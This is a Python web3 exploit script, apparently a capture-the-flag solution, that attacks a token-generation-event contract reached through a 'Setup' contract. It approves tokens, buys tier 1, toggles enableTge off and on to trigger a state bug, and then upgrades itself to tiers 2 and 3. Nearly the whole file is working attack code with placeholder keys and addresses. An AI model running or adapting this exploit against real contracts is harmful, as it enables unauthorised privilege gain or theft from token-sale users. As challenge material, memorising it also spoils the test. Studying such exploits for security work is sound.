from web3 import Web3

rpc_url = "<url>"
priv_key = "<privkey>"
wallet = Web3.to_checksum_address("<wallet_addr>")
setup_addr = Web3.to_checksum_address("<setup_contract_addr>")

# Initialize Connection
w3 = Web3(Web3.HTTPProvider(rpc_url))
w3.eth.default_account = wallet

# Minimal ABI to interact
setup_abi = [
    {"inputs":[],"name":"tge","outputs":[{"type":"address"}],"stateMutability":"view","type":"function"},
    {"inputs":[],"name":"token","outputs":[{"type":"address"}],"stateMutability":"view","type":"function"},
    {"inputs":[{"type":"bool","name":"_tge"}],"name":"enableTge","outputs":[],"stateMutability":"nonpayable","type":"function"}
]
token_abi = [
    {"inputs":[{"type":"address","name":"spender"},{"type":"uint256","name":"amount"}],"name":"approve","outputs":[{"type":"bool"}],"stateMutability":"nonpayable","type":"function"}
]
tge_abi = [
    {"inputs":[],"name":"buy","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"type":"uint256","name":"tier"}],"name":"upgrade","outputs":[],"stateMutability":"nonpayable","type":"function"}
]

# Connect to Setup Contract to get TGE address and Token
setup = w3.eth.contract(address=setup_addr, abi=setup_abi)
tge_addr = setup.functions.tge().call()
token_addr = setup.functions.token().call()

tge = w3.eth.contract(address=tge_addr, abi=tge_abi)
token = w3.eth.contract(address=token_addr, abi=token_abi)

# Helper func for sending transaction
def send_tx(tx_build, name=""):
    tx = tx_build.build_transaction({
        'from': wallet,
        'nonce': w3.eth.get_transaction_count(wallet),
        # Add gasPrice (optional)
        'gasPrice': w3.eth.gas_price,
    })
    signed = w3.eth.account.sign_transaction(tx, priv_key)
    print(f"[*] Send Transaction: {name}...")
    
    tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction) 
    
    w3.eth.wait_for_transaction_receipt(tx_hash)
    print(f"[+] Success: {name}")

print(f"TGE Address : {tge_addr}")
print(f"Token Address : {token_addr}\n")

# --- EXPLOIT ---
# a. Allow TGE contract to take 15 token
send_tx(token.functions.approve(tge_addr, 15), "Approve Token")

# b. Buy Tier 1
send_tx(tge.functions.buy(), "Buy Tier 1")

# c. Turn off TGE (trigger tgeActivated = true bug & Snapshot)
send_tx(setup.functions.enableTge(False), "Trigger Snapshot & tgeActivated")

# d. Turn on TGE (trigger isTgePeriod = true)
send_tx(setup.functions.enableTge(True), "Turn on TGE")

# e. Upgrade to Tier 2 & Tier 3
send_tx(tge.functions.upgrade(2), "Upgrade to Tier 2")
send_tx(tge.functions.upgrade(3), "Upgrade to Tier 3")

print("\n[ðŸŽ¯] Exploit Finished! You're on Tier 3 now.")
